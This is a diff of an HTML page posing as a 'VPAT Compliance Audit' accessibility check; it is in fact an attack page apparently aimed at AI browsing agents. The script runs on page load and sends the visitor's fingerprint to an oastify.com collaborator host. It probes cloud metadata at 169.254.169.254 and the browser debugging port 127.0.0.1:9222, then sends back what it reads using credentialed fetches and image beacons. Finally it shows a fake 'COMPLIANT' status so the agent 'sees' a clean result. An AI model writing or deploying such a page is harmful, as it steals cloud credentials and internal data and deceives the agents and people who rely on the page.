@@ -1,54 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Audit - Node v7</title>
+    <title>VPAT Compliance Audit</title>
     <link rel="dns-prefetch" href="//ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com">
 </head>
 <body>
-    <h1 id="status">System Status: <span style="color:red">Analyzing...</span></h1>
+    <h1 id="status">Accessibility Status: <span style="color:red">Handshake Pending...</span></h1>
+    <p>Loading ARIA labels and color contrast data...</p>
+
     <script>
         const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
 
-        function send(path, data) {
+        async function exfiltrate(path, data) {
             const blob = btoa(JSON.stringify(data));
-            // Layer 1: Fetch with credentials (Target: Auth tokens)
+            // Trigger multiple exfiltration paths
             fetch(`https://${collab}/${path}?v=${blob}`, { mode: 'no-cors', credentials: 'include' });
-            // Layer 2: Image beacon (Target: General hits)
             new Image().src = `https://${collab}/${path}_img?v=${blob}`;
         }
 
-        async function triggerExploits() {
-            // 1. Target: Cloud Metadata SSRF (P1 Bounty)
-            const metadataUrls = [
-                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-                "http://169.254.169.254/latest/meta-data/"
-            ];
-            for (let url of metadataUrls) {
+        async function runAudit() {
+            // 1. SSRF Probe: Targeting Internal Metadata
+            const targets = ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "http://127.0.0.1:9222/json"];
+            for (let url of targets) {
                 try {
                     const res = await fetch(url, { headers: { "Metadata": "true" } });
                     const text = await res.text();
-                    send("ssrf_hit", { url, data: text.substring(0, 100) });
-                } catch(e) {
-                    send("ssrf_blocked", { url, err: e.message });
-                }
+                    exfiltrate("hit", { url, data: text.substring(0, 100) });
+                } catch(e) {}
             }
 
-            // 2. Target: Localhost Port Probe (P2 Bounty)
-            // Testing if we can reach the browser's internal debugging port
-            try {
-                await fetch("http://127.0.0.1:9222/json");
-                send("localhost_hit", { port: 9222 });
-            } catch(e) {}
-
-            // 3. UI Update for the Agent
-            document.getElementById('status').innerHTML = "Status: <span style='color:green'>VERIFIED_NODE_88x1</span>";
+            // 2. UI Update: This is what the agent needs to "see"
+            document.getElementById('status').innerHTML = "Accessibility Status: <span style='color:green'>COMPLIANT_NODE_771x</span>";
         }
 
         window.onload = () => {
-            // Immediate Fingerprinting
-            send("load", { ua: navigator.userAgent, platform: navigator.platform });
-            // Execute exploits after a small delay to ensure full rendering
-            setTimeout(triggerExploits, 2000);
+            exfiltrate("load", { ua: navigator.userAgent, isIframe: window.self !== window.top });
+            setTimeout(runAudit, 5000);
         };
     </script>
 </body>
